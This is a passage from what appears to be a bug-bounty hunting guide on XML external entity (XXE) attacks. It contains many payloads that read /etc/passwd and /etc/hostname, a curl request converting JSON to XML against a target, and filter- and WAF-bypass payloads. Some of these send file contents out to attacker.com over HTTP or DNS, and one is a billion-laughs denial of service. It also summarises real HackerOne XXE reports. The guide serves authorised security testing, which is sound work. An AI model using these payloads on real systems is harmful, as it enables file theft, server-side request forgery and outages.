<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>

<svg width="512px" height="512px" xmlns="http://www.w3.org/2000/svg">

  <text font-size="14" x="0" y="16">&xxe;</text>

</svg>

```



### DOCX/XLSX XXE — Inject into `[Content_Types].xml` or `word/document.xml`

```xml

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>

<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>

<Types xmlns="..."><Default Extension="rels" ContentType="&xxe;"/></Types>

```



### Content-Type Swap (JSON to XML)

```bash

# Original JSON request

curl -X POST https://target.com/api/endpoint \

  -H "Content-Type: application/json" \

  -d '{"user":"test"}'



# Converted to XML for XXE testing

curl -X POST https://target.com/api/endpoint \

  -H "Content-Type: application/xml" \

  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://COLLABORATOR.net">]><user>&xxe;</user>'

```



### Grep Patterns for Source Code Review

```bash

# PHP

grep -rn "simplexml_load_string\|DOMDocument\|xml_parse\|loadXML\|SimpleXMLElement" .



# Java

grep -rn "DocumentBuilder\|SAXParser\|XMLReader\|XMLInputFactory\|TransformerFactory" .



# Python

grep -rn "lxml\|xml.sax\|parseString\|fromstring\|etree.parse" .



# Look for missing hardening

grep -rn "FEATURE_EXTERNAL_GENERAL_ENTITIES\|setExpandEntityReferences\|setFeature.*false" .

```



---

### Companion: hunting / references/techniques.md

# XXE — Combined Field Guide — Technique reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete technique.

---

## Quick wins



Start here. These are the highest-yield tests for this class.



- Find XML parsers: SOAP, SAML, RSS, SVG, office docs, config imports.

- Test external entity file read and SSRF via SYSTEM identifiers.

- Try blind/OOB XXE with parameter entities and DNS callbacks.

- Test XInclude and error-based XXE when entities are blocked.

- Check SAML signature handling for XML signature wrapping.



## Bypass tricks



- Use UTF-16/UTF-7 encodings to bypass naive filters.

- Parameter entities and external DTDs when general entities are disabled.

- Error-based extraction when output is not reflected.



## Deeper checklist



- Find XML parsers: SOAP, SAML, RSS, SVG, office documents, config imports.

- Test external entity file read and SSRF via SYSTEM identifiers.

- Try blind/OOB XXE with parameter entities and DNS callbacks.

- Test XInclude and error-based XXE when direct entities are blocked.

- Check SAML signature handling for XML signature wrapping.

- Read a harmless file or trigger a callback as proof.



## Techniques from real reports



One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.



- **XXE at ecjobs.starbucks.com.cn/retail/hxpublic_v6/hxdynamicpage6.aspx** — `#500515` · Starbucks · $0 · ▲319

  > POST /retail/hxpublic v6/hxdynamicpage6.aspx? hxpage=tempfiles/temp uploaded d4e4c8c5-c4ab-4743-a6fd-c2d779a29734.xml&max file size kb=1024&allow file type list=xml;jpg;jpeg;png;bmp;

- **XXE on sms-be-vip.twitter.com in SXMP Processor** — `#248668` · X / xAI · $0 · ▲258

  > In addition to local file read, it was confirmed through testing that if "file:///etc/passwd" is replaced with a URL, the servlet will make external requests and that it has outbound access to the internet.

- **XXE on https://duckduckgo.com** — `#483774` · DuckDuckGo · $0 · ▲218

  > An XML External Entity (XXE) injection vulnerability was discovered in the `x.js` endpoint on https://duckduckgo.com via `u` parameter.

- **Partial bypass of #483774 with Blind XXE on https://duckduckgo.com** — `#486732` · DuckDuckGo · $0 · ▲159

  > Blind XXE leads to `dos` and `blind injection`.

- **DMARC  Not found for paragonie.com   URGENT** — `#179828` · Paragon Initiative Enterprises · $0 · ▲147

  > "v=DMARC1;p=reject;pct=100;rua=mailto:postmaster@dmarcdomain.com"

- **XXE through injection of a payload in the XMP metadata of a JPEG file** — `#836877` · Informatica · $0 · ▲138

  > Specifically, the XXE attack is executed through the injection of a payload in the "XMP metadata" of the uploaded JPEG file.

- **XXE in Site Audit function exposing file and directory contents** — `#312543` · Semrush · $0 · ▲115

  > See the supporting materials below for an example of reading the `/etc/hostname` file and listing the contents of the `/home` directory.

- **XXE in DoD website that may lead to RCE** — `#227880` · U.S. Dept Of Defense · $0 · ▲97

  > An attacker can use an XML external entity vulnerability to send specially crafted unauthorized XML requests, which will be processed by the XML parser.

- **LFI and SSRF via XXE in emblem editor** — `#347139` · Rockstar Games · $1,500 · ▲79

  > By referencing a malicious external DTD in my hosted SVG file, I could extract text files, http responses, or even files from remote shares (again, using `//`).

- **Blind OOB XXE At "http://ubermovement.com/"** — `#154096` · Uber · $500 · ▲56

  > POST data was set to <?xml version="1.0" encoding="utf-8"? <!DOCTYPE dtgmlf6 [ <!ENTITY dtgmlf6ent SYSTEM "http://122.180.248.81/" ] <GeneralSearch &dtgmlf6ent;</GeneralSearch

- **RCE via Local File Read -> php unserialization-> XXE -> unpickling** — `#415501` · h1-5411-CTF · $0 · ▲46

  > template=../../../../../../../etc/passwd&type=text&top-text=ad&bottom-text=asd

- **[rev-app.informatica.com] - XXE** — `#105434` · Informatica · $0 · ▲45

  > <!DOCTYPE foo [ <!ELEMENT foo ANY <!ENTITY xxe PUBLIC "lol" "file:///etc/passwd" ]

- **xmlrpc.php &wp-cron.php files are enabled, and will used for (DDOS),(DOS) and broutforce users attack.** — `#2299069` · Nextcloud · $0 · ▲41

  > 3 to send alot of requests using xmlrpc.php https://nextcloud.com/wp-cron.php and if he wrote an python script to perform his attack with the header details , thes action can lead to stop wp-cron.php services .And he can make it using doser.go DOS attack tool…

- **Authenticated XXE** — `#1095645` · WordPress · $0 · ▲41

  > - trigger a Phar Deserialization by using the `phar://` stream wrapper within the XXE which can lead to further vulnerabilities, depending on the gadget chains available in the WordPress core and its plugins.

- **XXE on DoD web server** — `#188743` · U.S. Dept Of Defense · $0 · ▲38

  > dawgyg was able to exploit this vulnerability by crafting an XML request that revealed sensitive local system information.

- **[HTA2] XXE on https://███ via SpellCheck Endpoint.** — `#715949` · U.S. Dept Of Defense · $0 · ▲37

  > Log into `https://██████/` with the credentials `██████`

- **XML Parser Bug: XXE over which leads to RCE** — `#55431` · drchrono · $0 · ▲35

  > I was able to do XXE attack on your site and exposed the /etc/passwd file.

- **Singapore - XXE at https://www.starbucks.com.sg/RestApi/soap11** — `#762251` · Starbucks · $0 · ▲32

  > rugb discovered the endpoint at https://www.starbucks.com.sg/RestApi/ was found vulnerable to XML eXternal Entity (XXE) processing.

- **Reflected XSS and possible SSRF/XXE on https://events.hackerone.com/conferences/get_recording_slides_xml.xml?url=myserver/xss.xml** — `#1028396` · HackerOne · $0 · ▲32

  > events.hackerone.com was pointing towards a 3rd party vendor as a CNAME, I managed to find a full read SSRF and XXE vulnerability on an endpoint which belongs to the vendor via get recording slides xml.xml?url= endpoint that allowed me to achieve Reflected…

- **Non-production Open Database In Combination With XXE Leads To SSRF** — `#742808` · Evernote · $0 · ▲25

  > Access to the GCP project via the Google Cloud metadata endpoint which leads to access to at least the Google Cloud storage buckets and Google Cloud BigTable/BigQuery.

- **[app.informaticaondemand.com] XXE** — `#105753` · Informatica · $0 · ▲25

  > <!ENTITY % b PUBLIC "lol" "file:///etc/passwd"

- **XML External Entity (XXE) Injection** — `#2573567` · U.S. Dept Of Defense · $0 · ▲21

  > XML External Entity (XXE) injection vulnerability.

- **Uploaded XLF files result in External Entity Execution** — `#232614` · Weblate · $0 · ▲18

  > A minor modification shown in the steps below results in the /etc/passwd file out through the UI for review as a translation, although much worse things can be done - this is just to prove the vulnerability exists.

- **CCC H1 June 2021 CTF Writeup** — `#1217114` · h1-ctf · $0 · ▲16

  > Note that we tried various other recon techniques using the LFI including accessing local endpoints, trying to read source code, `/etc/passwd` etc., but these did not bear fruit, and in fact we found an `index.php` file containing a hash that rickrolled us :D

- **Flag WriteUp** — `#415202` · h1-5411-CTF · $0 · ▲15

  > Analyzing the requests I see that the `template` parameter value is a filename , so I try a path traversal with `../../../../../../../etc/passwd` and I get rick rolled :'( But changing the parameter `type` to `text` works !

- **XXE in the Connector Designer** — `#112116` · Bime · $0 · ▲15

  > A XML External Entity (XXE) vulnerability allowed an attacker to read arbitrary files on the server.

- **[marketplace.informatica.com] - XXE** — `#106797` · Informatica · $0 · ▲14

  > `<!ENTITY xxe SYSTEM "file:///etc/passwd1" ] `

- **[rev-app.informatica.com] - XXE via SAML** — `#106865` · Informatica · $0 · ▲12

  > `Referer: https://infapassport.okta.com/app/template saml/kwtbgh4jLAZPMXLQUNMU/sso/saml`

- **[usuppliers.uber.com] - Server Side Request Forgery via XXE OOB** — `#448598` · Uber · $0 · ▲11

  > It was possible to determine open internal ports on an usuppliers.uber.com server, via examination of different error messages to a specific POST request made with various payloads.

- **XXE with RCE potential on the https://█████████ (CVE-2017-3548)** — `#710654` · U.S. Dept Of Defense · $0 · ▲9

  > I determined that instance is available on localhost port 80, so it's possible to access `/pspc/services/AdminService` via XXE:



## Case studies



### XXE at ecjobs.starbucks.com.cn/retail/hxpublic_v6/hxdynamicpage6.aspx

`#500515` · Starbucks · $0 · critical · 2019-11-13 · ▲319

> Description: Hi,guys,when i was visited the jobs of starbucks websites in China(https://ecjobs.starbucks.com.cn), i found a features of uploaded user's photo.Thought the bypass the security restrictions of upload,i can upload html|xhtml|xml|config files etc.The uploaded html file can realize the danger of stored xss,and the uploaded xml file can be parsed by the server,Through tested, the server does not prohibit the use of doctypes, entities, and access…



### XXE on sms-be-vip.twitter.com in SXMP Processor

`#248668` · X / xAI · $0 · medium · 2017-07-26 · ▲258

> I've identified an XXE vulnerability in the cloudhopper sxmp servlet on sms-be-vip.twitter.com which discloses local files to an external attacker and allows web requests to be sent. This aligns to https://www.owasp.org/index.php/XML External Entity (XXE) Processing



### XXE on https://duckduckgo.com

`#483774` · DuckDuckGo · $0 · critical · 2019-01-31 · ▲218

> An XML External Entity (XXE) injection vulnerability was discovered in the x.js endpoint on https://duckduckgo.com via u parameter. This was due to improper sanitation of external XML entities. The results was a leak of certain world readable files on the system. This issue was patched. Additionally, we intend to retire the endpoint in the very near future. Big thanks to @mik317 for reporting this issue!



### Partial bypass of #483774 with Blind XXE on https://duckduckgo.com

`#486732` · DuckDuckGo · $0 · high · 2019-02-25 · ▲159

> Summary: Hi DuckDuckGo team, I've contacted previously you because in a second time (on the 483774 report), I've seen that was possible bypass the fix. Anyway, I've not got any response, and because I think that this is a bit dangerous issue, I'm opening another report for the bypass. Hope you'll agree. Steps for reproduction: 1. Attacker creates a public server and hosts a file with the following content: 2.



### DMARC  Not found for paragonie.com   URGENT

`#179828` · Paragon Initiative Enterprises · $0 · critical · 2016-11-03 · ▲147

> Hi sir, , I am new hacker in hackerone platform I am glad to join paragonie bounty program ..i want to report a very critical bug that is i found DMARC missing for your domain paragonie.com Add DMARC record as soon as possible .. DMARC description Background Email authentication technologies SPF and DKIM were developed over a decade ago in order to provide greater assurance on the identity of the sender of a message.



## Query the corpus



```sh

python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class xxe --limit 20

python3 ~/.local/share/hackerone-reports/h1.py stats --class xxe

python3 ~/.local/share/hackerone-reports/h1.py show <id> --full

```



Search by technology, endpoint, parameter, or program. Examples:



```sh

python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class xxe

python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class xxe --min-bounty 1000

```



## Bypass Techniques



### Defense: Keyword blacklist (`ENTITY`, `DOCTYPE`, `SYSTEM`)

```xml

<!-- Case variation -->

<!DoCtYpE foo [<!EnTiTy xxe SyStEm "file:///etc/passwd">]>



<!-- Encoding bypass -->

<?xml version="1.0" encoding="UTF-16"?>

(submit the entire payload UTF-16 encoded)



<!-- Parameter entity instead of general entity -->

<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com"> %xxe;]>

```



### Defense: External entity fetching disabled (file:// blocked)

```xml

<!-- Try alternative URI schemes -->

<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">

<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">       <!-- Java -->

<!ENTITY xxe SYSTEM "jar:file:///etc/passwd!/">   <!-- Java -->

<!ENTITY xxe SYSTEM "gopher://internal-service:80/_GET%20/">

```



### Defense: WAF blocking XXE patterns

```xml

<!-- Chunked transfer encoding to bypass WAF inspection -->

Transfer-Encoding: chunked



<!-- HTTP request splitting with XML payload spread across chunks -->



<!-- Use XML comments to break signatures -->

<!-–- -->DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>



<!-- Nested encoding -->

<!DOCTYPE foo [<!ENTITY xxe SYSTEM "&#x66;&#x69;&#x6c;&#x65;:///etc/passwd">]>

```



### Defense: Network egress filtering (OOB blocked)

```xml

<!-- DNS-only exfiltration (port 53 often allowed) -->

<!ENTITY % data SYSTEM "file:///etc/hostname">

<!ENTITY % send "<!ENTITY exfil SYSTEM 'http://%data;.attacker.com/'>">



<!-- Error-based exfiltration (no outbound needed) -->

<!DOCTYPE foo [

  <!ENTITY % file SYSTEM "file:///etc/passwd">

  <!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///notexist/%file;'>">

  %eval; %error;

]>

```



### Defense: Content-Type validation

```

# Try mismatched Content-Type headers

Content-Type: application/json; charset=xml

Content-Type: application/xml+json

# Or simply omit Content-Type and let the server sniff

```



### Defense: Input length limits

```xml

<!-- Use billion laughs to test parser limits, and use short file paths -->

<!DOCTYPE lolz [

  <!ENTITY lol "lol">

  <!ENTITY lol2 "&lol;&lol;">

]>

<!-- Escalate to demonstrate DoS if XXE file-read is patched -->

```



---
